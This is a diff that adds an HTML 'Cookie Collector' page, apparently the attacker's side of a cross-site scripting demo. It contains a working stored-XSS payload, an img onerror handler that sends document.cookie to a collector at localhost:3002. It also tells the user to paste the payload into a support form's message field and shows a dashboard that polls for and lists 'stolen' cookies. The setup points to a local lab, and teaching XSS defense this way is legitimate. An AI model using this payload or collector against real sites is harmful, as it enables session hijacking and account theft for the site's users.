@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cookie Collector</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #0a0a0a;
+      color: #00ff41;
+      font-family: 'Courier New', Courier, monospace;
+      min-height: 100vh;
+      padding: 2rem;
+    }
+
+    h1 {
+      font-size: 1.4rem;
+      margin-bottom: 0.5rem;
+      text-shadow: 0 0 8px rgba(0, 255, 65, 0.4);
+    }
+
+    .counter {
+      font-size: 0.95rem;
+      color: #4ade80;
+      margin-bottom: 2rem;
+    }
+
+    .listening {
+      font-size: 1rem;
+      margin-bottom: 2rem;
+    }
+
+    .cursor {
+      display: inline-block;
+      width: 10px;
+      height: 1.1em;
+      background: #00ff41;
+      animation: blink 1s step-end infinite;
+      vertical-align: text-bottom;
+      margin-left: 2px;
+    }
+
+    @keyframes blink {
+      50% { opacity: 0; }
+    }
+
+    .entries { margin-bottom: 3rem; }
+
+    .entry {
+      background: #111;
+      border: 1px solid #1a3a1a;
+      border-radius: 4px;
+      padding: 1rem 1.25rem;
+      margin-bottom: 1rem;
+      animation: none;
+    }
+
+    .entry.flash {
+      animation: glow 0.6s ease-out;
+    }
+
+    @keyframes glow {
+      0% { box-shadow: 0 0 20px 4px rgba(0, 255, 65, 0.6); border-color: #00ff41; }
+      100% { box-shadow: none; border-color: #1a3a1a; }
+    }
+
+    .entry .label {
+      color: #facc15;
+      font-weight: bold;
+      margin-bottom: 0.5rem;
+    }
+
+    .entry .cookie-value {
+      color: #00ff41;
+      word-break: break-all;
+    }
+
+    .payload-panel {
+      background: #1a1a1a;
+      border: 1px solid #333;
+      border-radius: 6px;
+      padding: 1.5rem;
+      margin-top: 2rem;
+    }
+
+    .payload-panel h2 {
+      font-size: 0.95rem;
+      color: #94a3b8;
+      margin-bottom: 1rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .payload-meta {
+      font-size: 0.85rem;
+      color: #64748b;
+      margin-bottom: 1rem;
+      line-height: 1.8;
+    }
+
+    .payload-meta strong { color: #94a3b8; }
+
+    pre {
+      background: #0d0d0d;
+      border: 1px solid #2a2a2a;
+      border-radius: 4px;
+      padding: 1rem;
+      font-size: 0.8rem;
+      color: #4ade80;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+      line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+  <h1>Cookie Collector — Waiting for victims...</h1>
+  <div class="counter" id="counter">Cookies stolen: 0</div>
+
+  <div id="listening" class="listening">
+    Listening on port 3002...<span class="cursor"></span>
+  </div>
+
+  <div class="entries" id="entries"></div>
+
+  <div class="payload-panel">
+    <h2>Attack Payload Used</h2>
+    <div class="payload-meta">
+      <strong>Submitter name:</strong> Attacker<br>
+      <strong>Subject:</strong> Having trouble logging in<br>
+      <strong>Message:</strong> (paste the payload below into the Message field)
+    </div>
+    <pre id="payload-code"></pre>
+  </div>
+
+  <script>
+    const PAYLOAD = '<img src="x" onerror="new Image().src=\'http://localhost:3002/steal?c=\'+encodeURIComponent(document.cookie)">';
+
+    document.getElementById('payload-code').textContent = PAYLOAD;
+
+    let knownCount = 0;
+    let flashedIds = new Set();
+
+    function formatTimestamp(iso) {
+      const d = new Date(iso);
+      const pad = (n) => String(n).padStart(2, '0');
+      return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
+    }
+
+    function renderEntries(entries) {
+      const container = document.getElementById('entries');
+      const listening = document.getElementById('listening');
+
+      document.getElementById('counter').textContent = `Cookies stolen: ${entries.length}`;
+
+      if (entries.length > 0) {
+        listening.style.display = 'none';
+      } else {
+        listening.style.display = 'block';
+        container.innerHTML = '';
+        knownCount = 0;
+        return;
+      }
+
+      if (entries.length > knownCount) {
+        container.innerHTML = '';
+
+        entries.forEach((entry, index) => {
+          const div = document.createElement('div');
+          div.className = 'entry';
+          const entryId = entry.timestamp + entry.cookie;
+
+          if (!flashedIds.has(entryId)) {
+            div.classList.add('flash');
+            flashedIds.add(entryId);
+          }
+
+          div.innerHTML = `
+            <div class="label">[COOKIE CAPTURED] ${formatTimestamp(entry.timestamp)}</div>
+            <div class="cookie-value">${entry.cookie}</div>
+          `;
+          container.appendChild(div);
+        });
+
+        knownCount = entries.length;
+      }
+    }
+
+    async function poll() {
+      try {
+        const res = await fetch('http://localhost:3002/api/stolen');
+        const entries = await res.json();
+        renderEntries(entries);
+      } catch (err) {
+        console.error('Poll failed:', err);
+      }
+    }
+
+    poll();
+    setInterval(poll, 1500);
+  </script>
+</body>
+</html>
